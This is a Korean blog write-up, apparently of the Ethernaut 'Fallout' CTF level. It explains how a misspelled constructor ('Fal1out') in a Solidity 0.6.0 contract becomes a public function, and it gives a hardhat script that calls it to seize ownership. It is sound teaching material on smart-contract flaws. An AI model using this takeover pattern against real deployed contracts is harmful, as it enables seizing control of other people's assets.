+++
title = "Fallout"
date = "2023-08-18"
+++

---

> My Solutions: [github](https://github.com/c0np4nn4/EtherStudy/tree/main/ethernaut_solution)

---

# TL;DR
> ***constructor*** 에 대해 알고 있는지 묻는 문제입니다.

# Description
이전 문제처럼 `Factory` 컨트랙트의 `validate` 부분을 통해, 문제 해결 조건을 확인해보면 아래와 같습니다.

<center>
<img alt="Get an Instance" src="../../ethernaut_img/2_fallout_1.png" />
</center>

즉, ***owner***가 되면 문제를 푼 것입니다.

---

# Exploit

> `Fallout` 컨트랙트의 전문은 [Fallout Contract](https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/levels/Fallout.sol)에서 확인할 수 있습니다.

`Fallout` 컨트랙트를 유심히 보다보면 **이상한 부분**을 하나 발견할 수 있습니다.

<center>
<img alt="constructor" src="../../ethernaut_img/2_fallout_2.png" />
</center>

*l* 대신에 *1* 이 적혀있는 것을 확인할 수 있습니다. (`Fallout` != `Fal1out`)

`Fallout.sol`에서 명시하는 `Solidity Compiler 0.6.0`은 컨트랙트의 이름과 함수 이름이 같을 때, 이를 ***constructor()*** 로써 사용합니다.
하지만 지금은 이름이 다르기 때문에 <u>*그냥 평범한 public 함수*</u>가 됩니다.
따라서, `Fal1out()`을 호출하면 문제를 해결할 수 있습니다.

## script
아래와 같이 `fallout.js` 를 작성해 `hardhat` 으로 문제를 해결했습니다.
```js
const {ethers} = require('hardhat');

const CTRT_ADDR = "0x9bd03768a7DCc129555dE410FF8E85528A4F88b5"
const PLAYER_ADDR = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"

async function main() {
  const player = await ethers.getSigner(PLAYER_ADDR);
  const contract = await ethers.getContractAt(
    "Fallout",
    CTRT_ADDR,
    player
  );

  console.log("--[1] call Fal1out")
  await contract.Fal1out();

  console.log("++[2] check")
  let owner = await contract.owner()
  if (owner === player.address) {
    console.log("++[2] DONE");
  }

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 실행 결과

<center>
<img alt="Run script" src="../../ethernaut_img/2_fallout_3.png" />
</center>

<center>
<img alt="Done" src="../../ethernaut_img/2_fallout_4.png" />
</center>


<script src="https://utteranc.es/client.js"
        repo="c0np4nn4/utterance_repo"
        issue-term="pathname"
        label="utterances"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>


